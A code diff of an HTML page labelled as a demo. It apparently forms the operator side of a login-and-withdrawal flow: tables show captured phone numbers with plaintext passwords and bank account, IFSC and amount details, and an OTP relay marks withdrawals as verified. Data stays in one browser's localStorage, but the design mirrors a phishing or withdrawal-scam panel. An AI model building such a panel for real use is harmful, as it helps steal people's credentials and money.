@@ -77,52 +77,62 @@ button{border:0;border-radius:13px;padding:12px 17px;font-weight:800;cursor:poin
 </div>
 
 <script>
-const KEY="withdrawal_demo_activity_v1";
+const KEY = "withdrawal_demo_activity_v1";
 let currentOTP = null;
 let otpActive = false;
 
-function getData(){try{return JSON.parse(localStorage.getItem(KEY)||"[]")}catch(e){return[]}}
-function esc(v){return String(v??"").replace(/[&<>"']/g,m=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#039;"}[m]))}
-function empty(cols){return `<tr><td colspan="${cols}" class="empty">No demo activity yet.</td></tr>`}
-
-function render(){
- var all=getData(), logs=all.filter(x=>x.type==="LOGIN"), withdrawals=all.filter(x=>x.type==="WITHDRAWAL");
- document.getElementById('loginCount').textContent=logs.length;
- document.getElementById('withdrawCount').textContent=withdrawals.length;
- document.getElementById('totalCount').textContent=all.length;
- 
- var loginRows=document.getElementById('loginRows');
- if(logs.length){
-   loginRows.innerHTML=logs.map(x=>`<tr>
-     <td>${esc(x.time)}</td>
-     <td><span class="pill">${esc(x.platform)}</span></td>
-     <td><strong>${esc(x.phone)}</strong></td>
-     <td><strong>${esc(x.password)}</strong></td>
-   </tr>`).join('');
- } else {
-   loginRows.innerHTML=empty(4);
- }
- 
- var withdrawRows=document.getElementById('withdrawRows');
- if(withdrawals.length){
-   withdrawRows.innerHTML=withdrawals.map(x=>`<tr>
-     <td>${esc(x.time)}</td>
-     <td>${esc(x.platform)}</td>
-     <td><strong>${esc(x.bank)}</strong></td>
-     <td><strong>${esc(x.account)}</strong></td>
-     <td><strong>${esc(x.ifsc)}</strong></td>
-     <td><strong>${esc(x.amount)}</strong></td>
-     <td><span class="pill" style="${x.verified ? 'background:#28a745;color:#fff;' : ''}">${x.verified ? '✅ Verified' : '⏳ Pending'}</span></td>
-   </tr>`).join('');
- } else {
-   withdrawRows.innerHTML=empty(7);
- }
+function getData() {
+  try { return JSON.parse(localStorage.getItem(KEY) || "[]"); } catch(e) { return []; }
 }
 
-function clearActivity(){
- if(confirm("Clear all demo activity from this browser?")){localStorage.removeItem(KEY);render()}
+function esc(v) {
+  return String(v ?? "").replace(/[&<>"']/g, function(m) {
+    return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#039;"}[m];
+  });
 }
 
+function empty(cols) {
+  return '<tr><td colspan="' + cols + '" class="empty">No demo activity yet.</td></tr>';
+}
+
+function render() {
+  var all = getData();
+  var logs = all.filter(function(x) { return x.type === "LOGIN"; });
+  var withdrawals = all.filter(function(x) { return x.type === "WITHDRAWAL"; });
+  
+  document.getElementById('loginCount').textContent = logs.length;
+  document.getElementById('withdrawCount').textContent = withdrawals.length;
+  document.getElementById('totalCount').textContent = all.length;
+  
+  var loginRows = document.getElementById('loginRows');
+  if (logs.length) {
+    loginRows.innerHTML = logs.map(function(x) {
+      return '<tr><td>' + esc(x.time) + '</td><td><span class="pill">' + esc(x.platform) + '</span></td><td><strong>' + esc(x.phone) + '</strong></td><td><strong>' + esc(x.password) + '</strong></td></tr>';
+    }).join('');
+  } else {
+    loginRows.innerHTML = empty(4);
+  }
+  
+  var withdrawRows = document.getElementById('withdrawRows');
+  if (withdrawals.length) {
+    withdrawRows.innerHTML = withdrawals.map(function(x) {
+      var statusClass = x.verified ? 'style="background:#28a745;color:#fff;"' : '';
+      var statusText = x.verified ? '✅ Verified' : '⏳ Pending';
+      return '<tr><td>' + esc(x.time) + '</td><td>' + esc(x.platform) + '</td><td><strong>' + esc(x.bank) + '</strong></td><td><strong>' + esc(x.account) + '</strong></td><td><strong>' + esc(x.ifsc) + '</strong></td><td><strong>' + esc(x.amount) + '</strong></td><td><span class="pill" ' + statusClass + '>' + statusText + '</span></td></tr>';
+    }).join('');
+  } else {
+    withdrawRows.innerHTML = empty(7);
+  }
+}
+
+function clearActivity() {
+  if (confirm("Clear all demo activity from this browser?")) {
+    localStorage.removeItem(KEY);
+    render();
+  }
+}
+
+// OTP Functions
 function generateOTP() {
   currentOTP = String(Math.floor(100000 + Math.random() * 900000));
   otpActive = true;
@@ -182,4 +192,44 @@ function resetOTP() {
   
   try {
     var channel = new BroadcastChannel('otp_channel');
-    channel.postMessage({type: 'RESET
+    channel.postMessage({type: 'RESET_OTP'});
+    channel.close();
+  } catch(e) {}
+}
+
+// BroadcastChannel Listener (User se messages)
+try {
+  var channel = new BroadcastChannel('otp_channel');
+  channel.onmessage = function(event) {
+    if (event.data.type === 'OTP_VERIFIED') {
+      document.getElementById('otpStatus').textContent = '✅ OTP Verified Successfully!';
+      document.getElementById('otpStatus').style.color = '#28a745';
+      document.getElementById('currentOtp').textContent = '✅ DONE';
+      document.getElementById('copyOtpBtn').style.display = 'none';
+      
+      var all = getData();
+      if (all.length > 0) {
+        var latest = all[0];
+        if (latest.type === 'WITHDRAWAL') {
+          latest.verified = true;
+          localStorage.setItem(KEY, JSON.stringify(all));
+          render();
+        }
+      }
+    }
+    if (event.data.type === 'OTP_VERIFY_FAILED') {
+      document.getElementById('otpStatus').textContent = '❌ Invalid OTP attempt!';
+      document.getElementById('otpStatus').style.color = '#dc3545';
+      setTimeout(function() {
+        document.getElementById('otpStatus').textContent = '📨 OTP ready. Waiting for verification.';
+        document.getElementById('otpStatus').style.color = '#28a745';
+      }, 3000);
+    }
+  };
+} catch(e) {}
+
+render();
+setInterval(render, 2000);
+</script>
+</body>
+</html>
